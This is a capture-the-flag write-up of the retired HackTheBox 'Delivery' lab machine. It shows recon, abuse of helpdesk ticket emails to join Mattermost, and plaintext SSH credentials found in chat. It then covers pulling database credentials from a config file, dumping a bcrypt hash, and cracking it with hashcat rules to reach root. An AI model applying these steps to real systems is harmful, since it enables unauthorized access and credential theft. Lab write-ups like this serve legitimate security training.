# HackTheBox — Delivery

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Credential Reuse / Hashcat Rules  
**Status:** Retired  

---

## Summary

Delivery showcases a realistic attack chain: exploiting a self-registration feature in a ticketing system to gain access to an internal Mattermost instance, finding credentials, and cracking a bcrypt hash using a custom Hashcat rule based on a password policy hint left by the sysadmin. Privilege escalation uses the cracked credentials.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/delivery 10.10.10.222
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1
80/tcp   open  http    nginx 1.14.2
8065/tcp open  http    (Mattermost)
```

Add to `/etc/hosts`:

```
10.10.10.222  delivery.htb helpdesk.delivery.htb
```

---

## Enumeration

### helpdesk.delivery.htb

An **osTicket** helpdesk portal. Creating a new ticket generates a temporary email address in the format:

```
1234567@delivery.htb
```

This email address receives all replies to the ticket — a feature we can abuse.

### Mattermost (Port 8065)

Visiting `http://delivery.htb:8065` shows a Mattermost server.

To register, you need an email with `@delivery.htb` domain to verify. We can use the ticket-generated email for this!

---

## Exploitation

### Abusing Ticket Email for Mattermost Registration

1. Create a ticket at `helpdesk.delivery.htb` → note the assigned email (e.g., `7932434@delivery.htb`)
2. Register at Mattermost using `7932434@delivery.htb`
3. The verification email is sent to that address — **view it by checking the ticket thread** at helpdesk
4. Click the verification link → Mattermost account confirmed

### Mattermost — Internal Credentials

After joining the "Internal" channel:

```
From: root
---
@developers Please make sure to use the hare on the new accounts
with temporary password set to PleaseSubscribe!

Also please, do not use generic passwords anymore. 
We use a hash for all accounts.
NOTE: @maildeliverer @maildelibverer Password for SSH: Youve_G0t_Mail!
```

Credentials found:
- SSH: `maildeliverer:Youve_G0t_Mail!`
- Password hint: variations of `PleaseSubscribe!`

---

## Initial Access

```bash
ssh maildeliverer@10.10.10.222
```

### User Flag

```bash
cat /home/maildeliverer/user.txt
```

---

## Privilege Escalation

### Database Credentials

```bash
cat /opt/mattermost/config/config.json | grep -i password
```

```json
"DataSource": "mmuser:Crack_The_MM_Admin_Hash!@tcp(127.0.0.1:3306)/mattermost?..."
```

### Dump Mattermost Hashes

```bash
mysql -u mmuser -p'Crack_The_MM_Admin_Hash!' mattermost
mysql> SELECT Username, Password FROM Users WHERE Username='root';
```

```
root | $2a$10$VM6EjMs/qpjQJXgKl.LDSeaGP.FIEAGEW7BO2P3RlnNhqFeSyWKA2
```

This is a **bcrypt** hash.

### Cracking with Custom Rules

The admin hinted that passwords are variations of `PleaseSubscribe!`. Use Hashcat rules to generate variants:

```bash
echo "PleaseSubscribe!" > base.txt
hashcat -m 3200 hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule
```

Or write a custom rule:

```
# rules.txt
:
c
u
$1
$2
$!
l$1
l$2$!
```

```bash
hashcat -m 3200 hash.txt base.txt -r rules.txt
```

Password cracked: **PleaseSubscribe!21**

### Switch to Root

```bash
su root
# Password: PleaseSubscribe!21
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Ticket system email addresses** can be used to bypass email domain restrictions in other services
- Internal chat/collaboration tools (Mattermost, Slack, RocketChat) often contain credentials in plain text
- **bcrypt** is slow to crack — use clues from the environment to narrow wordlist candidates
- Hashcat rules transform base passwords into thousands of variants quickly
- Never use predictable variations of a leaked base password

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| Browser | Web app abuse |
| ssh | Initial access |
| mysql | Database credential dump |
| hashcat | bcrypt hash cracking with rules |
